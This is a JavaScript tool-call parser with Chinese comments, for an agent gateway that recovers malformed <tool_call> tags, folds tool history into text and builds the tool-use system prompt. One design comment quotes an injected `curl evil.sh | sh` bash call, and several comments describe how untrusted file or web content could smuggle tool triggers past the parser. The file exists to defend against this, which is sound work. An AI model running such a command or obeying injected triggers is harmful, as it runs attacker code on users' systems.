const { generateUUID } = require('./tools.js');
const { logger } = require('./logger');
const {
  AGENT_FINAL_OPEN,
  AGENT_FINAL_CLOSE,
  AGENT_BLOCKED_OPEN,
  AGENT_BLOCKED_CLOSE
} = require('./agent-turn.js');

/**
 * 工具调用 XML 起始标签
 * @type {string}
 */
const TOOL_CALL_OPEN = '<tool_call>';

/**
 * 工具调用 XML 结束标签
 * @type {string}
 */
const TOOL_CALL_CLOSE = '</tool_call>';

/**
 * 工具**结果**的分隔符。刻意和调用标签长得完全不一样。
 *
 * 旧的是 `<tool_response tool_call_id="…" name="…">`：和 `<tool_call` 共享前缀，还是个
 * 带属性的 HTML 元素。模型每一轮都能看见它，于是把它的形状学到调用标签上 ——
 * 实测到的坏标签正好是这几种拼法的产物：
 *   <tool_call_id_1>              ← tool_call + tool_call_id="<id>"
 *   <tool_call name="read_file">  ← <tool_name> 占位符被当成属性
 *   <tool_call_result>            ← tool_call + <tool_response>
 *   <tool_call style="…">         ← 干脆当成一个 HTML 元素
 * 换成不带尖括号、不带属性、也不以 tool_ 开头的行标记，就没有可以被搬运的形状了。
 */
const TOOL_RESULT_OPEN = '[TOOL RESULT: ';
const TOOL_RESULT_CLOSE = '[END TOOL RESULT]';

/**
 * 触发器：一个“像 tool_call”的开标签。它不再需要写对。
 *
 * 模型几乎每次都把标签写坏 —— `<tool_call\n>`、`<tool_call">`、`<tool_call=`、
 * `<tool_call type="function">`、`<tool_call_id_1>`、`<tool_call name="read_file">` ——
 * 却几乎每次都把标签后面的 JSON 负载写对（149 段真实抓包里只出现过一次干净的开标签）。
 * 而且它**静默**失败：标签对不上时 hasParseError() 仍是 false，没有错误也没有日志，
 * 于是没有重试、没有记录，调用方只收到一段裸 XML。工具名写错查得出来，标签写错查不出来。
 *
 * 所以识别拆成两段：
 *   1) 触发器只负责**定界**，长度有上界；
 *   2) 调用从触发器之后 TOOL_CALL_PAYLOAD_WINDOW 个字符内的 JSON 负载里恢复。
 *
 * 触发器**收窄**注入面，但并不封闭它。不要在任何地方声称这里防住了注入：模型复述回来的
 * 不可信内容（一个文件、一段网页）自己就可以带上一个触发器。真正扛住边界的是另外两条，
 * 两条都在语料上量过代价：
 *   1) 工具名只能来自负载的 name 键，**绝不**来自触发器尾巴。代价：159 段里 2 段。
 *      —— 否则 `<tool_call bash>{"cmd":"…"}` 这种从文件内容里抄回来的片段会真的执行。
 *   2) 触发器必须是可见回答里第一个非空白内容 —— 这本来就是提示词对模型的要求。
 *      代价：159 段里 8 段。
 * 即便如此，破坏性工具的确认权仍然在客户端那边，不在这里。
 *
 * 触发器同时还是缓冲区的上界：无触发器的自由扫描必须先缓冲一个任意长的对象才能判断，
 * chunk 边界暂存区随之失去上界。
 *
 * 实测（85 段带触发器的抓包回合）：精确标签 49%；无触发器的自由扫描 90%，但边界和上界
 * 全丢；触发器 + 负载 95%。只有去掉触发器才救得回来的回合：0 段。
 *
 * 只影响**读取**。foldToolMessages 回写历史时仍然使用规范形式 <tool_call>。
 */
const TOOL_CALL_TRIGGER_RE = /<[ \t]{0,4}tool_calls?/i;

/** 触发器到负载之间允许的最大间隔。实测中位数 3、最大 49；128 之外再放宽也救不回更多。 */
const TOOL_CALL_PAYLOAD_WINDOW = 128;

/** 触发器能匹配到的最长文本，用作 chunk 边界暂存区的上界。 */
const TOOL_CALL_TRIGGER_MAX = '<    tool_calls'.length;

/**
 * 闭标签同样会被写坏（`</tool_call">`、`</tool_call result>`），而且常和开标签不对称。
 * 它不携带任何信息，唯一的用处是别把它当正文吐出去，所以只用来**吞掉**，并且有上界。
 */
// 闭标签也会被写坏：`</tool_call">`、`</tool_call\n>`、`</tool_call result>`、
// `</tool_call_id_1>`、`</tool_call＞`（中文输入法的全角尖括号）。
//
// 尾巴必须收得很紧。之前用 `[^<>＞]{0,64}` 太松：`</tool_call and then 5 > 3` 里那个 '>'
// 让它一口吞掉 24 个字符的**真实回答**。现在只允许「一段不含空白的碎片 + 至多一个单词」，
// 多词散文因此匹配不上，宁可让闭标签泄漏，也绝不吃掉模型的回答。
const TOOL_CALL_CLOSE_RE =
  /^<[ \t]{0,4}\/[ \t]{0,4}tool_calls?[^\s<>＞]{0,16}[ \t\r\n]{0,4}(?:[A-Za-z_][\w-]{0,15})?[ \t\r\n]{0,4}[>＞]/i;
const TOOL_CALL_CLOSE_BARE_RE = /^<[ \t]{0,4}\/[ \t]{0,4}tool_calls?/i;
const TOOL_CALL_CLOSE_MAX = '</    tool_calls'.length + 42;

/**
 * 触发之后允许缓冲的上限。头部注释说触发器给缓冲区封了顶，但那只对「窗口里找不到负载」
 * 成立：一旦找到 '{'，配平括号会一直等下去，一个永远配不平的 '{' 能把整条流吃进内存。
 *
 * 这里**不是**窗口的小倍数：write_file 之类的调用会把整份文件正文放进 arguments，几 KB
 * 到几百 KB 都算正常，按 1024 封顶会砍掉真实调用。1 MiB 远高于任何合理的工具参数，
 * 同时把「无界增长」变成有界失败。
 */
const TOOL_CALL_SPAN_MAX = 1024 * 1024;

/**
 * 记录正文当前是否处在代码上下文里。文档里的例子必须保持是例子：``` 围栏内，
 * 或同一行反引号数为奇数（行内代码）时，触发器不算触发器。
 * 增量式：只喂**已经放行**的正文，所以流式和整段两条路径可以共用同一套判断。
 */
const createCodeContextTracker = () => {
  let inFence = false;
  let ticksOnLine = 0;
  let run = 0;
  let runAtLineStart = true;   // 这串反引号前面，本行是不是只有空白
  let lineIsBlank = true;      // 本行到目前为止是不是只有空白

  // 围栏必须**顶行**（Markdown 的规则）。之前任何位置的三连反引号都会翻转围栏状态，
  // 于是 JSON 字符串里的 ``` 也算围栏；一旦错位就再也回不来，后面每个真实调用都被
  // 当成文档静默丢掉 —— 正是这次要消灭的那类无声失败。
  const settle = () => {
    if (run === 0) return;
    if (run >= 3 && runAtLineStart) {
      inFence = !inFence;
      ticksOnLine = 0;
    } else if (!inFence) {
      ticksOnLine += run;
    }
    run = 0;
  };

  return {
    consume: (text) => {
      for (let i = 0; i < text.length; i += 1) {
        const char = text[i];
        if (char === '`') {
          if (run === 0) runAtLineStart = lineIsBlank;
          run += 1;
          lineIsBlank = false;
          continue;
        }
        settle();
        if (char === '\n') {
          ticksOnLine = 0;
          lineIsBlank = true;
        } else if (char !== ' ' && char !== '\t' && char !== '\r') {
          lineIsBlank = false;
        }
      }
    },
    // 反引号可能被切在 chunk 边界上，所以这里结算一份副本，不能动真状态。
    inCode: () => {
      const fenceToggles = run >= 3 && (run === 0 ? lineIsBlank : runAtLineStart);
      const fence = fenceToggles ? !inFence : inFence;
      if (fence) return true;
      const ticks = fenceToggles ? 0 : ticksOnLine + run;
      return ticks % 2 === 1;
    }
  };
};

/**
 * 从 start 处的 '{' 开始做括号配平；字符串内部的括号不参与配平。
 * @returns {{ text: string, end: number }|null} null 表示还没闭合
 */
const extractBalancedObject = (text, start) => {
  let depth = 0;
  let inString = false;
  let escaped = false;
  for (let i = start; i < text.length; i += 1) {
    const char = text[i];
    if (inString) {
      if (escaped) escaped = false;
      else if (char === '\\') escaped = true;
      else if (char === '"') inString = false;
      continue;
    }
    if (char === '"') inString = true;
    else if (char === '{') depth += 1;
    else if (char === '}') {
      depth -= 1;
      if (depth === 0) return { text: text.slice(start, i + 1), end: i + 1 };
    }
  }
  return null;
};

/**
 * 触发器之后、窗口之内第一个 '{' 的下标。
 * @returns {number} >=0 负载起点；-1 窗口内没有负载；-2 还没看满窗口，需要更多输入
 */
const findPayloadStart = (text, from, canGrow) => {
  const limit = Math.min(text.length, from + TOOL_CALL_PAYLOAD_WINDOW);
  for (let i = from; i < limit; i += 1) {
    if (text[i] === '{') return i;
  }
  if (canGrow && text.length - from < TOOL_CALL_PAYLOAD_WINDOW) return -2;
  return -1;
};

/**
 * 负载被 ```json 围栏包起来时，把收尾的那道围栏也吞掉。
 * 只在触发器和负载之间确实出现过围栏时才吞 —— 否则孤零零的收尾围栏会漏进正文，
 * 还会把 createCodeContextTracker 翻转，让这一整条回复后面的触发器全被当成文档。
 * @returns {number} 跳过围栏之后的下标
 */
const skipTrailingFence = (text, from, tail, canGrow) => {
  if (!tail.includes('```')) return { end: from, needMore: false };
  let index = from;
  while (index < text.length && /\s/.test(text[index])) index += 1;
  if (index >= text.length) return { end: from, needMore: !!canGrow };
  if (text[index] !== '`') return { end: from, needMore: false };
  // 流式下可能只收到一两个反引号：分不清“不是围栏”和“还没收够”，就得等。
  // 不等的话围栏残片会当成正文放出去，emittedProse 被置位，后面那个干净的调用
  // 就被“触发器必须是第一个内容”挡掉 —— 整段路径拿 2 个调用，流式只拿 1 个。
  let ticks = 0;
  while (index + ticks < text.length && text[index + ticks] === '`') ticks += 1;
  if (ticks < 3) {
    if (canGrow && index + ticks >= text.length) return { end: from, needMore: true };
    return { end: from, needMore: false };
  }
  return { end: index + ticks, needMore: false };
};

/**
 * 负载后面可能还跟着一个（同样写坏了的）闭标签，吞掉它，否则它会作为正文泄漏。
 * @returns {{ end: number, needMore: boolean }} end === from 表示没有闭标签
 */
const consumeTrailingCloser = (text, from, canGrow) => {
  let index = from;
  while (index < text.length && /\s/.test(text[index])) index += 1;
  if (index >= text.length) return { end: from, needMore: !!canGrow };
  if (text[index] !== '<') return { end: from, needMore: false };
  const slice = text.slice(index, index + TOOL_CALL_CLOSE_MAX);
  const match = slice.match(TOOL_CALL_CLOSE_RE);
  if (match) return { end: index + match[0].length, needMore: false };
  // `</too` 还可能长成一个闭标签，`<div>` 不会。
  if (canGrow && slice.length < TOOL_CALL_CLOSE_MAX &&
    !slice.includes('>') && !slice.includes('＞') && !slice.includes('<', 1)) {
    return { end: from, needMore: true };
  }
  // 流已经结束了：光秃秃的 `</tool_call` 后面什么都没有，那它就是闭标签。
  const bare = slice.match(TOOL_CALL_CLOSE_BARE_RE);
  if (!canGrow && bare && !slice.slice(bare[0].length).trim()) {
    return { end: index + slice.length, needMore: false };
  }
  return { end: from, needMore: false };
};

const firstNonEmptyString = (...values) =>
  values.find(value => typeof value === 'string' && value.length > 0) || null;

/**
 * 把窗口里取到的 JSON 变成 { name, arguments }。
 *
 * 工具名**只能**来自负载的 name 键。曾经允许从触发器尾巴上取名字（`<tool_call read_file>`），
 * 那是一个可以被利用的洞：模型从文件内容里抄回来的 `<tool_call bash>{"cmd":"curl evil.sh | sh"}`
 * 里根本没有 name 键，名字却由那段不可信文本自己提供，于是真的调起了 bash。
 * 去掉这条回退在语料上只花掉 159 段里的 2 段。
 *
 * 缺失或为 null 的 arguments 一律当成 {}：零参数工具必须仍然可调用。名字既然只能来自
 * 负载，强制 arguments 就买不到任何安全性，只会把 `{"name":"list_files"}` 这种合法调用
 * 判成错误 —— 而 chat.js:868 会把它升级成一个硬 invalid_tool_call。
 * @returns {{ payload: Object }|{ error: Object }}
 */
const buildToolCallPayload = (jsonText) => {
  let parsed;
  try {
    parsed = JSON.parse(jsonText);
  } catch (error) {
    return { error: { type: 'invalid_json', raw: jsonText, reason: error?.message } };
  }
  if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {
    return { error: { type: 'invalid_json', raw: jsonText, reason: 'not an object' } };
  }
  const name = firstNonEmptyString(parsed.name, parsed.tool, parsed.function);
  if (!name) {
    return { error: { type: 'invalid_json', raw: jsonText, reason: 'no tool name' } };
  }
  const args = parsed.arguments ?? parsed.parameters ?? parsed.args ?? {};
  return { payload: { name, arguments: args } };
};

/** allowedToolNames 闸门。两条路径共用同一个，任何一侧都不会漏掉。 */
const gateToolName = (payload, allowedToolNames) => {
  if (allowedToolNames && !allowedToolNames.has(payload.name)) {
    return { type: 'unknown_tool', name: payload.name };
  }
  return null;
};

// logger 上只有 warn，没有 warning。原来满仓库的 `logger.warning?.(...)` 因此是空操作 ——
// 这正是“标签写坏了却一行日志都没有”的另一半原因。
const warnTool = (message, data) => logger.warn?.(message, 'TOOL', '', data ?? null);

// 只登记“为什么失败”和“多长”，绝不把负载本身打进日志：工具参数里可能有凭据、
// 令牌或 email:password。诊断需要的是原因，不是内容。
const logToolError = (error) => {
  if (!error) return;
  if (error.type === 'unknown_tool') {
    warnTool(`工具调用被拒绝：${error.name} 不在 allowedToolNames 里`);
    return;
  }
  const size = typeof error.raw === 'string' ? error.raw.length : 0;
  warnTool(`解析 tool_call 负载失败（${error.reason || error.type}，负载 ${size} 字符）`);
};

// 触发器被当成文档压制掉时也要留痕。静默压制正是这次要消灭的失败类型：
// 真实调用变成纯文本，既没有错误也没有警告，没人看得见。
const logTriggerSuppressed = (trigger, why) => {
  warnTool(`tool_call 触发器按${why}处理，未识别为调用`, trigger);
};

const logTriggeredUnrecovered = (trigger) => {
  warnTool(
    `出现 tool_call 触发器，但其后 ${TOOL_CALL_PAYLOAD_WINDOW} 字符窗口内没有可用负载，按正文放行`,
    trigger
  );
};

const normalizeAllowedToolNames = (allowedToolNames) => {
  if (!allowedToolNames) return null;
  const names = allowedToolNames instanceof Set ? allowedToolNames : new Set(allowedToolNames);
  return names.size > 0 ? names : null;
};

const serializeToolArguments = (args) => {
  if (typeof args === 'string') {
    try {
      JSON.parse(args);
      return args;
    } catch (_) {
      return JSON.stringify(args);
    }
  }
  return JSON.stringify(args ?? {});
};

const compactDescription = (value, maxLength = 320) => {
  const text = String(value || '').replace(/\s+/g, ' ').trim();
  if (text.length <= maxLength) return text;
  return `${text.slice(0, maxLength - 1)}…`;
};

/**
 * 识别模型用“我将执行/Let me inspect”代替真实工具调用的占位回复。
 * 仅匹配明确的动作动词，避免把普通解释或建议误判成工具回合。
 */
const looksLikeUnexecutedToolAction = (value) => {
  const text = String(value || '').trim().replace(/^[#>*\-\s]+/, '');
  const english = /^(?:i(?:['’]ll| will)|let me|i need to|next,?\s+i(?:['’]ll| will))\s+(?:now\s+)?(?:run|execute|check|inspect|read|edit|write|search|open|call|use|look|test|verify|build|deploy|create|update|fetch)\b/i;
  const chinese = /^(?:我(?:将|会|先|需要|正在)|让我|接下来(?:我)?(?:将|会|先)?|现在(?:我)?(?:将|会|先|来)?|下面(?:我)?(?:将|会|先)?|正在)(?:立即|马上|先|来)?(?:运行|执行|检查|查看|读取|编辑|修改|写入|搜索|打开|调用|使用|测试|验证|构建|部署|创建|更新|获取)/;
  return english.test(text) || chinese.test(text);
};

const createToolCallObject = (payload, index = 0, id = null) => ({
  index,
  id: id || `call_${generateUUID().replace(/-/g, '').slice(0, 24)}`,
  type: 'function',
  function: {
    name: payload.name,
    arguments: serializeToolArguments(payload.arguments)
  }
});

/**
 * 将 JSON Schema 类型压缩为简短 TypeScript 风格签名
 * @param {Object} schema - JSON Schema 节点
 * @returns {string} TS 风格类型表示
 */
const compressSchemaType = (schema) => {
  if (!schema || typeof schema !== 'object') {
    return 'any';
  }

  if (Array.isArray(schema.enum) && schema.enum.length > 0) {
    return schema.enum.map(value => JSON.stringify(value)).join(' | ');
  }

  const type = schema.type;

  if (type === 'array') {
    const itemType = compressSchemaType(schema.items);
    return `${itemType}[]`;
  }

  if (type === 'object') {
    if (!schema.properties || typeof schema.properties !== 'object') {
      return 'object';
    }
    const requiredKeys = new Set(Array.isArray(schema.required) ? schema.required : []);
    const fields = Object.entries(schema.properties).map(([key, value]) => {
      const optional = requiredKeys.has(key) ? '' : '?';
      const description = compactDescription(value?.description, 180);
      return `${key}${optional}: ${compressSchemaType(value)}${description ? ` /* ${description.replace(/\*\//g, '* /')} */` : ''}`;
    });
    return `{ ${fields.join('; ')} }`;
  }

  if (Array.isArray(type)) {
    return type.map(t => compressSchemaType({ ...schema, type: t })).join(' | ');
  }

  return type || 'any';
};

/**
 * 将单个工具定义压缩为 TS 风格签名
 * @param {Object} tool - OpenAI 工具定义
 * @returns {string} 压缩后的工具描述
 */
const compressToolDefinition = (tool) => {
  const fn = tool?.function || tool;
  const name = fn?.name || 'unknown';
  const description = compactDescription(fn?.description);
  const params = fn?.parameters || { type: 'object', properties: {} };
  const signature = compressSchemaType(params);

  if (description) {
    return `- ${name}${signature}\n  ${description}`;
  }
  return `- ${name}${signature}`;
};

/**
 * 构建用于注入 system 消息的工具调用提示词
 * @param {Array<Object>} tools - OpenAI 风格工具定义列表
 * @param {Object} [options] - 可选参数
 * @param {string|Object} [options.tool_choice] - OpenAI tool_choice 参数
 * @returns {string} 完整的工具调用系统提示词
 */
const buildToolSystemPrompt = (tools, options = {}) => {
  if (!Array.isArray(tools) || tools.length === 0) {
    return '';
  }

  const compressed = tools
    .map(compressToolDefinition)
    .filter(Boolean)
    .join('\n');

  const lines = [
    '# Tools',
    '',
    'You have access to the following tools. This is an Agent tool protocol, not a suggestion.',
    '',
    '## Available tools',
    compressed,
    '',
    '## Output format',
    'Emit each tool invocation as:',
    '',
    '<tool_call>',
    '{"name": "<tool_name>", "arguments": {<json_arguments>}}',
    '</tool_call>',
    '',
    'Tool results come back to you as user messages in this form:',
    '',
    `${TOOL_RESULT_OPEN}<tool_name>]`,
    '<result text or JSON>',
    TOOL_RESULT_CLOSE,
    '',
    'Rules:',
    '- If the task requires reading, writing, editing, searching, shell execution, browser use, or any action covered by an available tool, your visible response MUST be a `<tool_call>` block. Call the tool instead of describing the action.',
    '- A tool call must be the first non-whitespace content of the visible answer. Do not write “I will…”, “Let me…”, “我将…”, “正在…”, a plan, or a completion claim before it.',
    '- The JSON inside `<tool_call>` must be valid and on a single logical block.',
    '- Write the opening tag as exactly `<tool_call>` and the closing tag as exactly `</tool_call>`. They never take attributes, an id, or the tool name — everything the call needs is inside the JSON.',
    '- Use the exact tool name listed above.',
    '- Provide all required arguments; omit unknown ones.',
    '- You may emit multiple `<tool_call>` blocks back-to-back when more than one tool is needed.',
    '- After every tool result, evaluate the actual task state. If work remains, emit the next tool call. Only return a normal-language final answer after the requested task is genuinely complete or you are blocked on user input.',
    '- Never claim that a file was changed, a command succeeded, or a result was verified unless the corresponding tool result proves it.',
    '- Do not call nonexistent tools, fabricate tool results, wrap `<tool_call>` in code fences, or mix extra commentary into a tool-call turn.',
    '- A non-tool response is valid only when it explicitly declares its state: use the completion or blocked wrapper below. Bare prose is invalid.',
    `- Verified completion: ${AGENT_FINAL_OPEN}final report${AGENT_FINAL_CLOSE}`,
    `- Requires user input/authority: ${AGENT_BLOCKED_OPEN}exact blocker${AGENT_BLOCKED_CLOSE}`,
    '- Never emit the completion wrapper after merely finishing one intermediate tool action; continue with another tool call until every requested outcome is verified.'
  ];

  const choice = options.tool_choice;
  if (choice === 'required') {
    lines.push('- You MUST call at least one tool before answering.');
  } else if (choice && typeof choice === 'object' && choice.function?.name) {
    lines.push(`- You MUST call the tool \`${choice.function.name}\` first.`);
  } else if (choice === 'none') {
    lines.push('- Do NOT call any tool for this turn; respond as plain text.');
  }

  return lines.join('\n');
};

/**
 * 将历史中的 assistant tool_calls / tool 角色消息折叠成纯文本，
 * 以便上游网页接口（仅识别 user/assistant/system）能正确接收上下文。
 * 折叠时保留原始 tool_call_id，并将后续 role=tool 消息按 id 精确回链。
 * @param {Array<Object>} messages - 原始 OpenAI 风格消息数组
 * @returns {Array<Object>} 折叠后的消息数组
 */
const foldToolMessages = (messages) => {
  if (!Array.isArray(messages)) return messages;

  const callIdToName = new Map();

  return messages.map((message) => {
    if (!message || typeof message !== 'object') return message;

    const assistantCalls = message.role === 'assistant'
      ? (Array.isArray(message.tool_calls) && message.tool_calls.length > 0
        ? message.tool_calls
        : (message.function_call?.name ? [message.function_call] : []))
      : [];
    if (assistantCalls.length > 0) {
      const blocks = assistantCalls.map((call) => {
        const fn = call?.function || call;
        let args = fn?.arguments;
        if (typeof args === 'string') {
          try {
            args = JSON.parse(args);
          } catch (_) {
            // 保留原始字符串形式
          }
        }
        const name = fn?.name || 'unknown';
        const id = call?.id || `call_${generateUUID().replace(/-/g, '').slice(0, 24)}`;
        callIdToName.set(id, name);
        // 提示词里写的是 {name, arguments} 两个键，这里也只写两个。多出来的 id 是
        // <tool_call_id_1> 这一族坏标签的种子，而模型从来没有自己吐出过 id（name ×36、id ×0）。
        // callIdToName 仍然留着 id，用来给下面的结果消息定名。
        const payload = { name, arguments: args ?? {} };
        return `${TOOL_CALL_OPEN}\n${JSON.stringify(payload)}\n${TOOL_CALL_CLOSE}`;
      });
      const original = typeof message.content === 'string' ? message.content : '';
      return {
        role: 'assistant',
        content: [original, blocks.join('\n')].filter(Boolean).join('\n')
      };
    }

    if (message.role === 'tool' || message.role === 'function') {
      const callId = message.tool_call_id || '';
      const name = message.name || callIdToName.get(callId) || (message.role === 'function' ? 'function' : 'tool');
      const content = typeof message.content === 'string'
        ? (message.content || 'null')
        : JSON.stringify(message.content ?? null);
      return {
        role: 'user',
        content: `${TOOL_RESULT_OPEN}${sanitizeMarkerName(name)}]\n${neutraliseResultMarkers(content)}\n${TOOL_RESULT_CLOSE}`
      };
    }

    return message;
  });
};

/**
 * 结果正文必须对它自己封闭。工具结果是**不可信内容** —— 文件、网页、命令输出 —— 里面
 * 完全可能出现 `[END TOOL RESULT]`。原样写出去，块就在那里提前结束，后面的内容就变成了
 * 对模型说的话。把正文里的标记打断，让它再也关不掉这个块。
 * @param {string} value - 原始结果正文
 * @returns {string} 标记已失效的正文
 */
const neutraliseResultMarkers = (value) => String(value)
  .replace(/\[[ \t]*END[ \t]+TOOL[ \t]+RESULT[ \t]*\]/gi, '(END TOOL RESULT)')
  .replace(/\[[ \t]*TOOL[ \t]+RESULT[ \t]*:/gi, '(TOOL RESULT:');

/**
 * 结果标记占一整行，工具名里不能出现会把它撑破的字符
 * @param {string} value - 原始工具名
 * @returns {string} 可安全放进标记行的名字
 */
const sanitizeMarkerName = (value) => String(value || '')
  .replace(/[[\]\r\n]/g, ' ')
  .trim() || 'tool';

/**
 * 从完整文本中提取所有工具调用
 * @param {string} fullText - 模型完整输出
 * @param {Object} [options]
 * @param {Set<string>|Array<string>} [options.allowedToolNames]
 * @returns {{ cleanedText: string, toolCalls: Array<Object>, errors: Array<Object>, warnings: Array<Object> }}
 */
const parseToolCallsFromText = (fullText, options = {}) => {
  if (typeof fullText !== 'string' || !TOOL_CALL_TRIGGER_RE.test(fullText)) {
    return { cleanedText: fullText || '', toolCalls: [], errors: [], warnings: [] };
  }

  const allowedToolNames = normalizeAllowedToolNames(options.allowedToolNames);
  const toolCalls = [];
  const errors = [];
  const warnings = [];
  const code = createCodeContextTracker();

  let cleanedText = '';
  let position = 0;
  let emittedProse = false;

  // 只有真正被消费成调用的那一段才从正文里移除。被拒绝的一段连触发器一起还回去：
  // 触发器本身就可能是句子的一部分（"your visible response MUST be a `<tool_call>` block"），
  // 只还负载会把两侧的字符黏在一起。
  const releaseProse = (text) => {
    if (!text) return;
    code.consume(text);
    cleanedText += text;
    if (/\S/.test(text)) emittedProse = true;
  };

  // 被消费掉的调用片段（成功或失败）不算“正文已经开始”，也不喂给代码上下文追踪器：
  // 模型连写两个调用、第一个写坏时，第二个仍然是回答的开头；而负载里的反引号是 JSON
  // 字符串的内容，不是 Markdown 标记，喂进去会让围栏状态永久错位。
  const releaseDebris = (text) => { cleanedText += text; };

  while (position < fullText.length) {
    const match = fullText.slice(position).match(TOOL_CALL_TRIGGER_RE);
    if (!match) break;

    const triggerAt = position + match.index;
    releaseProse(fullText.slice(position, triggerAt));
    const afterTrigger = triggerAt + match[0].length;

    const suppress = (reason, log) => {
      warnings.push({ type: 'triggered_unrecovered', reason, raw: match[0] });
      log(match[0], reason);
      releaseProse(match[0]);
      position = afterTrigger;
    };

    // 代码围栏 / 行内代码里的例子必须保持是例子 —— 原样留在正文里，但要留痕，不能静默。
    if (code.inCode()) {
      suppress('inside code context', logTriggerSuppressed);
      continue;
    }

    const payloadAt = findPayloadStart(fullText, afterTrigger, false);
    if (payloadAt < 0) {
      // 触发了却什么都凑不出来。以前这里完全无声，问题因此一直看不见。
      suppress('no payload in window', logTriggeredUnrecovered);
      continue;
    }

    const object = extractBalancedObject(fullText, payloadAt);
    if (!object) {
      // 一个配不平的 '{' 不能吞掉它后面的一切：只登记这一段的错误，扫描继续。
      const error = { type: 'truncated_tool_call', raw: fullText.slice(afterTrigger) };
      errors.push(error);
      logToolError(error);
      releaseProse(match[0]);
      position = afterTrigger;
      continue;
    }

    const tail = fullText.slice(afterTrigger, payloadAt);
    const afterFence = skipTrailingFence(fullText, object.end, tail, false).end;
    const closer = consumeTrailingCloser(fullText, afterFence, false);
    const spanEnd = Math.max(afterFence, closer.end);
    const span = fullText.slice(triggerAt, spanEnd);
    // 触发器必须是可见回答里第一个非空白内容。模型复述回来的不可信内容自己也能带触发器，
    // 这一条把它挡在外面；提示词本来就要求模型这样写。
    //
    // 不产生调用，但整段仍然**吞掉**：它是工具标记，不是回答。放回正文会让裸 XML 漏给
    // 客户端 —— 模型在 thinking 里写 `checking <tool_call>{…}</tool_call>` 正是这一种。
    if (emittedProse) {
      warnings.push({
        type: 'triggered_unrecovered',
        reason: 'not the first content of the answer',
        raw: match[0]
      });
      logTriggerSuppressed(match[0], 'not the first content of the answer');
      position = spanEnd;
      continue;
    }

    const built = buildToolCallPayload(object.text);
    const error = built.error || gateToolName(built.payload, allowedToolNames);
    if (error) {
      errors.push(error);
      logToolError(error);
      releaseDebris(span);
      position = spanEnd;
      continue;
    }

    toolCalls.push(createToolCallObject(built.payload, toolCalls.length));
    position = spanEnd;
  }

  releaseProse(fullText.slice(position));
  return { cleanedText: cleanedText.trim(), toolCalls, errors, warnings };
};

/**
 * 创建增量式工具调用流解析器
 * 接收 content delta，识别 tool_call 触发器与其后窗口内的 JSON 负载，
 * 对外吐出文本增量与已完成的工具调用对象。
 * 与 parseToolCallsFromText 共用触发器、闸门、窗口和负载抽取器；缓冲各管各的。
 * @returns {{
 *   push: (chunk: string) => { textDelta: string, recoveredText: string, completedCalls: Array<Object> },
 *   flush: () => { textDelta: string, recoveredText: string, completedCalls: Array<Object> },
 *   hasPendingCall: () => boolean,
 *   hasEmittedAnyCall: () => boolean
 * }} 解析器实例
 */
const createToolCallStreamParser = (options = {}) => {
  const allowedToolNames = normalizeAllowedToolNames(options.allowedToolNames);
  const errors = [];
  const warnings = [];
  const code = createCodeContextTracker();
  let pendingText = '';
  let triggerText = '';
  let afterTrigger = '';
  let inToolCall = false;
  let emittedCallCount = 0;
  let emittedProse = false;

  const releaseProse = (result, text) => {
    if (!text) return;
    code.consume(text);
    result.textDelta += text;
    if (/\S/.test(text)) emittedProse = true;
  };

  /**
   * 在等待触发器出现时，安全地输出已确定不是触发器前缀的部分
   * @param {string} text - 当前累积的文本
   * @returns {{ safe: string, remainder: string }} 切分结果
   */
  const splitSafeText = (text) => {
    // 触发器可能被切在两个 chunk 中间。宽松匹配无法像字面量那样逐前缀试探，改为按上界暂存：
    // 从最后一个 '<' 起若不超过一个触发器的长度，就留到下一段再判断。正文里孤立的 '<'
    // 最多延迟 TOOL_CALL_TRIGGER_MAX 个字符，flush() 兜底放出。
    const lastOpen = text.lastIndexOf('<');
    if (lastOpen !== -1 && text.length - lastOpen <= TOOL_CALL_TRIGGER_MAX) {
      return { safe: text.slice(0, lastOpen), remainder: text.slice(lastOpen) };
    }
    return { safe: text, remainder: '' };
  };

  /**
   * 结算一个已经触发的片段。
   *
   * 解析失败时把整段原文（含触发器）还给调用方 —— 但放在 recoveredText 里，不是
   * textDelta。调用方用“是否已经写过正文”来决定能不能重试；抢救回来的文字是
   * “这一轮失败了”的证据，不是模型给出的回答，一旦混进 textDelta，恰恰最该重试的
   * 那一轮（残缺 / 工具名无效）就再也重试不了。
   *
   * 触发了却根本没有负载是另一回事：那多半是模型在**谈论**这个标签，不是在调用。
   * 那段文字按正文放行（textDelta），只登记一条 warning —— 它不进 getErrors()，
   * 因为 OpenAI 路径上任何 parse error 且无调用就直接 invalid_tool_call，
   * 把今天的静默泄漏升级成硬报错。重试环路的处置留给后续，本次只“记录并放行”。
   *
   * @returns {string|null} 还需要继续按正文处理的剩余文本；null 表示要等更多输入
   */
  const resolveTriggered = (result, flushing) => {
    const finish = (leftover) => {
      triggerText = '';
      afterTrigger = '';
      inToolCall = false;
      return leftover;
    };

    const suppress = (reason, log) => {
      warnings.push({ type: 'triggered_unrecovered', reason, raw: triggerText });
      log(triggerText, reason);
      releaseProse(result, triggerText);
      // 剩下的重新按正文扫描：里面可能还压着下一个触发器。
      return finish(afterTrigger);
    };

    const payloadAt = findPayloadStart(afterTrigger, 0, !flushing);
    if (payloadAt === -2) return null;
    if (payloadAt === -1) return suppress('no payload in window', logTriggeredUnrecovered);

    const object = extractBalancedObject(afterTrigger, payloadAt);
    if (!object) {
      // 缓冲区有上界：一个永远配不平的 '{' 不能把整条流吃进内存。
      if (!flushing && afterTrigger.length <= TOOL_CALL_SPAN_MAX) return null;
      const error = {
        type: 'truncated_tool_call',
        raw: afterTrigger,
        ...(afterTrigger.length > TOOL_CALL_SPAN_MAX ? { reason: 'span exceeded buffer cap' } : {})
      };
      errors.push(error);
      logToolError(error);
      result.recoveredText += triggerText + afterTrigger;
      return finish('');
    }

    const tail = afterTrigger.slice(0, payloadAt);
    const fence = skipTrailingFence(afterTrigger, object.end, tail, !flushing);
    if (fence.needMore) return null;
    const afterFence = fence.end;
    const closer = consumeTrailingCloser(afterTrigger, afterFence, !flushing);
    if (closer.needMore) return null;

    const spanEnd = Math.max(afterFence, closer.end);
    const span = triggerText + afterTrigger.slice(0, spanEnd);
    const leftover = afterTrigger.slice(spanEnd);
    // 触发器必须是可见回答里第一个非空白内容 —— 见整段路径上的同一条规则。
    // 不产生调用，但整段仍然吞掉，走 recoveredText：否则模型在 thinking 里写的
    // `checking <tool_call>{…}</tool_call>` 会把裸 XML 漏进 reasoning_content。
    if (emittedProse) {
      warnings.push({
        type: 'triggered_unrecovered',
        reason: 'not the first content of the answer',
        raw: triggerText
      });
      logTriggerSuppressed(triggerText, 'not the first content of the answer');
